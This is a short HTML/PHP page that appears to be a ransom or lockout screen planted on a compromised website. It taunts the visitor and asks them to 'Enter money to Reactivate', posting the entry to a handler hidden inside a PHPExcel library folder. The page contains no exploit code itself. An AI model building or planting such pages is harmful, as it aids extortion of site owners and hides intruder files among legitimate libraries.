
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tapos Lang</title>
</head>
<body>
    <h1>HAHAHAHAHA, wait lang</h1>
    <form action="libraries/phpexcel/PHPExcel/CalcEngine/solution.php" method="post">
        <label for="password">Enter money to Reactivate:</label>
        <input type="password" name="password" id="password" required>
        <button type="submit">Submit</button>
    </form>
    <?php if (isset($error)) { echo "<p style='color:red;'>$error</p>"; } ?>
</body>
</html>
